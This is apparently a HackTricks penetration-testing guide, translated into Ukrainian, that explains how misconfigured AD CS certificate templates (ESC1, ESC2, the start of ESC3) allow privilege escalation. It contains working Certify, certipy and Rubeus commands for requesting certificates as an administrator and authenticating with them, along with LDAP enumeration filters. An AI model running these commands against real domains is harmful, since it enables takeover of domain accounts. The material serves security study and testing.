# –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ–≥—ñ–π –≤ –¥–æ–º–µ–Ω—ñ AD CS

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

**–¶–µ –ø—ñ–¥—Å—É–º–æ–∫ —Ä–æ–∑–¥—ñ–ª—ñ–≤ –ø—Ä–æ —Ç–µ—Ö–Ω—ñ–∫–∏ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ–≥—ñ–π –∑ –ø—É–±–ª—ñ–∫–∞—Ü—ñ–π:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ - ESC1

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏—Ö —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ - ESC1

* **–ü—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –Ω–∞–¥–∞—é—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ–≥—ñ—è–º–∏ –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–∞ CA.**
* **–ù–µ –ø–æ—Ç—Ä—ñ–±–Ω–µ —Å—Ö–≤–∞–ª–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞.**
* **–ù–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—ñ–¥–ø–∏—Å–∏ –≤—ñ–¥ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–æ–≥–æ –ø–µ—Ä—Å–æ–Ω–∞–ª—É.**
* **–î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ –±–µ–∑–ø–µ–∫–∏ –Ω–∞ —à–∞–±–ª–æ–Ω–∞—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –¥—É–∂–µ –¥–æ–∑–≤–æ–ª—è—é—Ç—å, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ–≥—ñ—è–º–∏ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é.**
* **–®–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è EKU, —è–∫—ñ —Å–ø—Ä–∏—è—é—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó:**
* –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ Extended Key Usage (EKU), —Ç–∞–∫—ñ —è–∫ –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–ª—ñ—î–Ω—Ç–∞ (OID 1.3.6.1.5.5.7.3.2), PKINIT –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–ª—ñ—î–Ω—Ç–∞ (1.3.6.1.5.2.3.4), –í—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–º–∞—Ä—Ç-–∫–∞—Ä—Ç–∏ (OID 1.3.6.1.4.1.311.20.2.2), –ë—É–¥—å-—è–∫–∞ –º–µ—Ç–∞ (OID 2.5.29.37.0) –∞–±–æ –±–µ–∑ EKU (SubCA) –≤–∫–ª—é—á–µ–Ω—ñ.
* **–ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∫–ª—é—á–µ–Ω–Ω—è subjectAltName –≤ –∑–∞–ø–∏—Ç –Ω–∞ –ø—ñ–¥–ø–∏—Å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ (CSR) –¥–æ–∑–≤–æ–ª–µ–Ω–∞ —à–∞–±–ª–æ–Ω–æ–º:**
* –ê–∫—Ç–∏–≤–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ (AD) –Ω–∞–¥–∞—î –ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç subjectAltName (SAN) –≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ, —è–∫—â–æ –≤—ñ–Ω –ø—Ä–∏—Å—É—Ç–Ω—ñ–π. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ, –≤–∫–∞–∑–∞–≤—à–∏ SAN –≤ CSR, –º–æ–∂–Ω–∞ –∑–∞–ø—Ä–æ—Å–∏—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–º–µ–Ω—É). –ß–∏ –º–æ–∂–µ –∑–∞–ø–∏—Ç—É–≤–∞—á –≤–∫–∞–∑–∞—Ç–∏ SAN, –≤–∫–∞–∑–∞–Ω–æ –≤ –æ–±'—î–∫—Ç—ñ AD —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ —á–µ—Ä–µ–∑ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `mspki-certificate-name-flag`. –¶—è –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å —î –±—ñ—Ç–æ–≤–æ—é –º–∞—Å–∫–æ—é, —ñ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –ø—Ä–∞–ø–æ—Ä—Ü—è `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–∏—Ç—É–≤–∞—á—É –≤–∫–∞–∑–∞—Ç–∏ SAN.

{% hint style="danger" %}
–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ–≥—ñ—è–º–∏ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –∑ –±—É–¥—å-—è–∫–∏–º SAN –Ω–∞ –≤–∏–±—ñ—Ä, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —è–∫ –±—É–¥—å-—è–∫–æ–≥–æ –¥–æ–º–µ–Ω–Ω–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞ —á–µ—Ä–µ–∑ Kerberos –∞–±–æ SChannel.
{% endhint %}

–¶—è —Ñ—É–Ω–∫—Ü—ñ—è —ñ–Ω–æ–¥—ñ –∞–∫—Ç–∏–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –º–∏—Ç—Ç—î–≤–æ–≥–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è HTTPS –∞–±–æ —Ö–æ—Å—Ç-—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –ø—Ä–æ–¥—É–∫—Ç–∞–º–∏ –∞–±–æ —Å–ª—É–∂–±–∞–º–∏ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è, –∞–±–æ —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å —Ä–æ–∑—É–º—ñ–Ω–Ω—è.

–ó–∞—É–≤–∞–∂—É—î—Ç—å—Å—è, —â–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –∑ —Ü—ñ—î—é –æ–ø—Ü—ñ—î—é –≤–∏–∫–ª–∏–∫–∞—î –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è, —â–æ –Ω–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —É –≤–∏–ø–∞–¥–∫—É, –∫–æ–ª–∏ —ñ—Å–Ω—É—é—á–∏–π —à–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —à–∞–±–ª–æ–Ω `WebServer`, —É —è–∫–æ–º—É –≤–≤—ñ–º–∫–Ω–µ–Ω–æ `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) –¥—É–±–ª—é—î—Ç—å—Å—è, –∞ –ø–æ—Ç—ñ–º –∑–º—ñ–Ω—é—î—Ç—å—Å—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ–π–Ω–æ–≥–æ OID. 

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–î–ª—è **–ø–æ—à—É–∫—É –≤—Ä–∞–∑–ª–∏–≤–∏—Ö —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤** –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
–î–ª—è **–∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü—ñ—î—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞** –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
–ü–æ—Ç—ñ–º –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —É —Ñ–æ—Ä–º–∞—Ç `.pfx`** —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Rubeus –∞–±–æ certipy** –∑–Ω–æ–≤—É:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows-–±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ "Certreq.exe" —Ç–∞ "Certutil.exe" –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

–ï–Ω—É–º–µ—Ä–∞—Ü—ñ—è —à–∞–±–ª–æ–Ω—ñ–≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ —É —Å—Ö–µ–º—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó AD Forest, –∑–æ–∫—Ä–µ–º–∞ —Ç–∏—Ö, —è–∫—ñ –Ω–µ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å —Å—Ö–≤–∞–ª–µ–Ω–Ω—è –∞–±–æ –ø—ñ–¥–ø–∏—Å—ñ–≤, –º–∞—é—Ç—å EKU –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–ª—ñ—î–Ω—Ç–∞ –∞–±–æ Smart Card Logon, —Ç–∞ –∑ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–º –ø—Ä–∞–ø–æ—Ä—Ü–µ–º `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø—É—Å–∫—É –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ LDAP-–∑–∞–ø–∏—Ç—É:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ - ESC2

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–î—Ä—É–≥–∏–π —Å—Ü–µ–Ω–∞—Ä—ñ–π –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —î –≤–∞—Ä—ñ–∞—Ü—ñ—î—é –ø–µ—Ä—à–æ–≥–æ:

1. –ü—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é –Ω–∞–¥–∞—é—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–∞ CA.
2. –í–∏–º–æ–≥–∞ —â–æ–¥–æ —Å—Ö–≤–∞–ª–µ–Ω–Ω—è –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º –≤–∏–º–∫–Ω–µ–Ω–∞.
3. –ü—Ä–æ–ø—É—â–µ–Ω–∞ –ø–æ—Ç—Ä–µ–±–∞ –≤ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –ø—ñ–¥–ø–∏—Å–∞—Ö.
4. –ù–∞–¥—Ç–æ –¥–æ–∑–≤—ñ–ª—å–Ω–∏–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –±–µ–∑–ø–µ–∫–∏ –Ω–∞ —à–∞–±–ª–æ–Ω—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –Ω–∞–¥–∞—î –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.
5. **–®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤–∏–∑–Ω–∞—á–µ–Ω–æ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è EKU –¥–ª—è –±—É–¥—å-—è–∫–æ—ó –º–µ—Ç–∏ –∞–±–æ –±–µ–∑ EKU.**

**EKU –¥–ª—è –±—É–¥—å-—è–∫–æ—ó –º–µ—Ç–∏** –¥–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –¥–ª—è **–±—É–¥—å-—è–∫–æ—ó –º–µ—Ç–∏**, –≤–∫–ª—é—á–∞—é—á–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∫–ª—ñ—î–Ω—Ç–∞, –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —Å–µ—Ä–≤–µ—Ä–∞, –ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è –∫–æ–¥—É —Ç–æ—â–æ. –¢–æ–π —Å–∞–º–∏–π **–ø—ñ–¥—Ö—ñ–¥, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è ESC3**, –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—å–æ–≥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é.

–°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –∑ **–≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—é EKU**, —è–∫—ñ –¥—ñ—é—Ç—å —è–∫ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –ø—ñ–¥–ø–æ—Ä—è–¥–∫–æ–≤–∞–Ω–æ–≥–æ –¶–°, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è **–±—É–¥—å-—è–∫–æ—ó –º–µ—Ç–∏** —ñ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –ø—ñ–¥–ø–∏—Å—É –Ω–æ–≤–∏—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∫–∞–∑–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ EKU –∞–±–æ –ø–æ–ª—è –≤ –Ω–æ–≤–∏—Ö —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –ø—ñ–¥–ø–æ—Ä—è–¥–∫–æ–≤–∞–Ω–æ–≥–æ –¶–°.

–û–¥–Ω–∞–∫ –Ω–æ–≤—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –¥–ª—è **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ–º–µ–Ω—É**, –Ω–µ –±—É–¥—É—Ç—å –ø—Ä–∞—Ü—é–≤–∞—Ç–∏, —è–∫—â–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –ø—ñ–¥–ø–æ—Ä—è–¥–∫–æ–≤–∞–Ω–æ–≥–æ –¶–° –Ω–µ —î –¥–æ–≤—ñ—Ä–µ–Ω–∏–º –æ–±'—î–∫—Ç–æ–º **`NTAuthCertificates`**, —â–æ —î –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º. –¢–∏–º –Ω–µ –º–µ–Ω—à, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤—Å–µ —â–µ –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ **–Ω–æ–≤—ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –∑ –±—É–¥—å-—è–∫–∏–º EKU** —Ç–∞ –¥–æ–≤—ñ–ª—å–Ω–∏–º–∏ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ **–∑–ª–æ–≤–∂–∏–≤–∞–Ω–æ** –¥–ª—è —à–∏—Ä–æ–∫–æ–≥–æ —Å–ø–µ–∫—Ç—Ä—É —Ü—ñ–ª–µ–π (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è –∫–æ–¥—É, –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è —Å–µ—Ä–≤–µ—Ä–∞ —Ç–æ—â–æ) —Ç–∞ –º–æ–∂–µ –º–∞—Ç–∏ –∑–Ω–∞—á—É—â—ñ –Ω–∞—Å–ª—ñ–¥–∫–∏ –¥–ª—è —ñ–Ω—à–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤ –≤ –º–µ—Ä–µ–∂—ñ, —Ç–∞–∫–∏—Ö —è–∫ SAML, AD FS –∞–±–æ IPSec.

–î–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É —à–∞–±–ª–æ–Ω—ñ–≤, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å —Ü—å–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—é –≤ —Å—Ö–µ–º—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –ª—ñ—Å—É AD, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ —à–∞–±–ª–æ–Ω–∏ –∞–≥–µ–Ω—Ç–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó - ESC3

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π —Å—Ö–æ–∂–∏–π –Ω–∞ –ø–µ—Ä—à–∏–π —ñ –¥—Ä—É–≥–∏–π, –∞–ª–µ **–∑–ª–æ–≤–∂–∏–≤–∞—î** **—ñ–Ω—à–∏–º EKU** (–ê–≥–µ–Ω—Ç –∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞) —Ç–∞ **2 —Ä—ñ–∑–Ω–∏–º–∏ —à–∞–±–ª–æ–Ω–∞–º–∏** (—Ç–æ–º—É –º–∞—î 2 –Ω–∞–±–æ—Ä–∏ –≤–∏–º–æ–≥),

**EKU –∞–≥–µ–Ω—Ç–∞ –∑–∞–ø–∏—Ç—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞** (OID 1.3.6.1.4.1.311.20.2.1), –≤—ñ–¥–æ–º–∏–π —è–∫ **–ê–≥–µ–Ω—Ç —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó** –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó Microsoft, –¥–æ–∑–≤–æ–ª—è—î –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É **—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏—Å—è** –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤—ñ–¥ —ñ–º–µ–Ω—ñ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**.

